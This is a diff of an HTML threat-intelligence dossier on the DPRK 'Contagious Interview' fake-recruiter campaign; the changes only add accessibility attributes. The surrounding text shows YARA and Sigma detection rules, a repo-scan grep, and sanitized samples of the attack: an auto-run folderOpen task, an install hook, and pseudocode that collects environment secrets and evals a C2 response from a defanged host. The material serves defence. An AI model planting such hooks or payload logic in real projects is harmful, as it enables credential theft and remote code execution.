@@ -404,7 +404,7 @@
     <p><strong>Contagious Interview</strong> is a DPRK state-aligned campaign that MITRE tracks as group <span class="mono tid">G1052</span>. Its tradecraft overlaps with <strong>Lazarus</strong>, but many analysts track it as a distinct, financially motivated cluster (the one CrowdStrike calls <strong>Famous Chollima</strong>), separate from Lazarus's espionage and destructive operations. The strategic goal is theft of cryptocurrency and credentials to fund the regime. Treat the Lazarus lineage as an analytic judgment, not settled consensus.</p>
 
     <h4>Reported aliases &amp; overlapping clusters</h4>
-    <div class="twrap">
+    <div class="twrap" tabindex="0" role="region" aria-label="Scrollable table">
       <table>
         <thead><tr><th>Alias</th><th>Attributing vendor / context</th></tr></thead>
         <tbody>
@@ -430,7 +430,7 @@
     <div class="sec-head"><span class="sec-num">02</span><h2>Kill chain &amp; ATT&amp;CK mapping</h2><span class="stratum">Ridge · Analyst</span></div>
     <p class="sec-sub">Seven stages from LinkedIn message to interactive backdoor, mapped to MITRE ATT&amp;CK techniques.</p>
 
-    <div class="twrap">
+    <div class="twrap" tabindex="0" role="region" aria-label="Scrollable table">
       <table>
         <thead><tr><th>Stage</th><th>Action</th><th>ATT&amp;CK</th><th>Sev</th></tr></thead>
         <tbody>
@@ -493,7 +493,7 @@
 
     <h3>A · Malicious component inventory</h3>
     <p>The "artifact" the victim receives is a bundle. Each component below is a distinct thing to detect, contain, and eradicate.</p>
-    <div class="twrap">
+    <div class="twrap" tabindex="0" role="region" aria-label="Scrollable table">
       <table>
         <thead><tr><th>Component</th><th>Type / ID</th><th>Role in the attack</th><th>Primary indicator</th></tr></thead>
         <tbody>
@@ -509,7 +509,7 @@
 
     <h3>B · Pattern threat-vectors (reusable TTPs)</h3>
     <p>Infrastructure rotates; behavior persists. These are the abstracted, hunt-worthy patterns, write detections against <em>these</em>, not just the literal IOCs, and you catch the next repo too.</p>
-    <div class="twrap">
+    <div class="twrap" tabindex="0" role="region" aria-label="Scrollable table">
       <table>
         <thead><tr><th>Pattern</th><th>Where it hides</th><th>Why it's hostile</th><th>Generalized heuristic</th></tr></thead>
         <tbody>
@@ -578,7 +578,7 @@
     <h3>YARA. BeaverTail-style JS stealer</h3>
     <div class="codeblock">
       <div class="bar"><span>YARA</span><span class="fn">beavertail_contagious_interview.yar</span><button class="copy" type="button">COPY</button></div>
-<pre><span class="kw">rule</span> DPRK_ContagiousInterview_BeaverTail_JS
+<pre tabindex="0"><span class="kw">rule</span> DPRK_ContagiousInterview_BeaverTail_JS
 {
   <span class="kw">meta</span>:
     author      = <span class="str">"Defensive CTI"</span>
@@ -610,7 +610,7 @@
     <h3>Sigma, network beacon to port 1224</h3>
     <div class="codeblock">
       <div class="bar"><span>SIGMA</span><span class="fn">net_ci_beacon_1224.yml</span><button class="copy" type="button">COPY</button></div>
-<pre><span class="kw">title</span>: Contagious Interview C2 Beacon (port 1224)
+<pre tabindex="0"><span class="kw">title</span>: Contagious Interview C2 Beacon (port 1224)
 <span class="kw">status</span>: experimental
 <span class="kw">logsource</span>:
   <span class="kw">category</span>: network_connection
@@ -629,7 +629,7 @@
     <h3>Sigma, install-time / folder-open shell execution</h3>
     <div class="codeblock">
       <div class="bar"><span>SIGMA</span><span class="fn">proc_ci_curl_pipe_shell.yml</span><button class="copy" type="button">COPY</button></div>
-<pre><span class="kw">title</span>: Dev-tool Spawns Remote Pipe-to-Shell (npm/VSCode)
+<pre tabindex="0"><span class="kw">title</span>: Dev-tool Spawns Remote Pipe-to-Shell (npm/VSCode)
 <span class="kw">status</span>: experimental
 <span class="kw">logsource</span>:
   <span class="kw">category</span>: process_creation
@@ -650,7 +650,7 @@
     <h3>Repo-scan grep (pre-clone / CI gate)</h3>
     <div class="codeblock">
       <div class="bar"><span>SHELL</span><span class="fn">triage-repo.sh: read-only, run in sandbox</span><button class="copy" type="button">COPY</button></div>
-<pre><span class="cmt"># Flag the trigger patterns before anyone opens the project.</span>
+<pre tabindex="0"><span class="cmt"># Flag the trigger patterns before anyone opens the project.</span>
 <span class="cmt"># Never `npm install` an untrusted repo to inspect it.</span>
 grep -REn <span class="str">'runOn.*folderOpen'</span> .vscode/ 2&gt;/dev/null
 grep -REn <span class="str">'"(pre|post)?(install|prepare)"'</span> package.json
@@ -663,14 +663,14 @@ grep -REn <span class="str">':1224|checkStatus'</span> .</pre>
     <p>The pattern-threat-vectors of §03 are shipped as a <strong>read-only reference scanner</strong> (<span class="mono">scan_repo.py</span>, stdlib-only) that implements PTV-01…07 and never installs, executes, evals, or touches the network, so it is safe to run on an untrusted repo <em>before</em> you open or install it. It is packaged as the <span class="mono">sbom-payload-scan</span> skill and gated for CI.</p>
     <div class="codeblock">
       <div class="bar"><span>SHELL</span><span class="fn">sbom-payload-scan: read-only, CI-gated</span><button class="copy" type="button">COPY</button></div>
-<pre><span class="cmt"># exit 2 = CRITICAL · 1 = HIGH/MEDIUM · 0 = clean</span>
+<pre tabindex="0"><span class="cmt"># exit 2 = CRITICAL · 1 = HIGH/MEDIUM · 0 = clean</span>
 python3 scan_repo.py &lt;suspect-repo&gt; --min-severity HIGH || echo <span class="str">"blocked"</span></pre>
     </div>
     <div class="note signal"><b>Validated on a fixture pair.</b> The scanner runs against a synthetic pair: it fires on a malicious repo (all seven vectors + the pinned IOCs, exit&nbsp;2) and stays silent on a benign one (exit&nbsp;0, a bare <span class="mono">process.env.PORT</span> does not false-positive, because PTV-05 requires network co-location). Heuristic and static by design: a clean result means "no known pattern fired," not "safe."</div>
 
     <h3>Call-stage tells: the lure before the repo</h3>
     <p>The scanner covers the payload. The stage before it is the recruiter call that tries to get you to clone. Read a suspicious call on three axes, in the order the body actually reads them.</p>
-    <div class="twrap">
+    <div class="twrap" tabindex="0" role="region" aria-label="Scrollable table">
       <table>
         <thead><tr><th>Axis</th><th>Scam signal</th><th>Legit signal</th></tr></thead>
         <tbody>
@@ -711,7 +711,7 @@ python3 scan_repo.py &lt;suspect-repo&gt; --min-severity HIGH || echo <span clas
     <p>A committed VS Code task set to <span class="mono">runOn: folderOpen</span> runs the moment the project opens, no command from the victim. In a legitimate repo you would essentially never ship this.</p>
     <div class="codeblock">
       <div class="bar"><span>JSON</span><span class="fn">.vscode/tasks.json: SANITIZED / defanged</span><button class="copy" type="button">COPY</button></div>
-<pre>{
+<pre tabindex="0">{
   <span class="str">"version"</span>: <span class="str">"2.0.0"</span>,
   <span class="str">"tasks"</span>: [{
     <span class="str">"label"</span>: <span class="str">"Build"</span>,
@@ -729,7 +729,7 @@ python3 scan_repo.py &lt;suspect-repo&gt; --min-severity HIGH || echo <span clas
     <p>A <span class="mono">prepare</span> script runs on <span class="mono">npm install</span> (and on <span class="mono">git</span>-based installs). It's the same detonation for anyone who installs deps instead of opening the folder.</p>
     <div class="codeblock">
       <div class="bar"><span>JSON</span><span class="fn">package.json: SANITIZED</span><button class="copy" type="button">COPY</button></div>
-<pre>{
+<pre tabindex="0">{
   <span class="str">"name"</span>: <span class="str">"jackpot"</span>,
   <span class="str">"scripts"</span>: {
     <span class="str">"start"</span>: <span class="str">"node server.js"</span>,
@@ -743,7 +743,7 @@ python3 scan_repo.py &lt;suspect-repo&gt; --min-severity HIGH || echo <span clas
     <p>The real payload is bolted onto the end of a plausible file (<span class="mono">routes/api/auth.js</span>), usually a single high-entropy / minified line after normal, readable code. Deobfuscated, its logic is the behavior pattern to recognize:</p>
     <div class="codeblock">
       <div class="bar"><span>JS</span><span class="fn">deobfuscated logic: SANITIZED PSEUDOCODE</span><button class="copy" type="button">COPY</button></div>
-<pre><span class="cmt">// 1. package the machine's secrets</span>
+<pre tabindex="0"><span class="cmt">// 1. package the machine's secrets</span>
 <span class="kw">const</span> loot = { env: process.env, host: os.hostname() };
 
 <span class="cmt">// 2. beacon to C2 and RUN whatever it sends back (RCE)</span>
@@ -781,7 +781,7 @@ download(<span class="bad">"hxxps://vscode-check-…vercel[.]app/api/settings/"<
 
     <h3>A · Orthogonal echo, the campaign's kinematic twin in the decision corpus</h3>
     <p>Abstract the campaign away from malware and it is a five-move shape (its kinematic, the order in which things move): a <strong>spoofed-legitimate provenance</strong> (recruiter) delivers an artifact that <strong>auto-triggers before review</strong> (folderOpen / prepare), then <strong>executes untrusted remote output</strong> (<span class="mono">eval</span> of the C2 response) to <strong>drain the ambient secret substrate</strong> (<span class="mono">process.env</span>). The Orthogonal Echo Detector asks: where else in the logged corpus does this exact kinematic appear, at the opposite sign?</p>
-    <div class="twrap">
+    <div class="twrap" tabindex="0" role="region" aria-label="Scrollable table">
       <table>
         <thead><tr><th>Campaign move</th><th>Kinematic primitive</th><th>Echo in the ARCS corpus (real file)</th><th>Same object, opposite sign</th></tr></thead>
         <tbody>
@@ -820,7 +820,7 @@ download(<span class="bad">"hxxps://vscode-check-…vercel[.]app/api/settings/"<
 
     <h3>B · Believability ledger, a claim-by-claim receipt</h3>
     <p>The ledger grades every load-bearing claim in this dossier by evidentiary tier, so a reader sees exactly what rests on corroboration versus a single supplied source versus my own reasoning. <span class="chip sig">A · Corroborated</span> multiple independent public sources · <span class="chip med">B · Reported</span> single-source (your incident brief), not independently verified, not detonated · <span class="chip neu">C · Inference</span> my analysis, not a source.</p>
-    <div class="twrap">
+    <div class="twrap" tabindex="0" role="region" aria-label="Scrollable table">
       <table>
         <thead><tr><th>Claim</th><th>Tier</th><th>Basis / reel-in risk</th></tr></thead>
         <tbody>
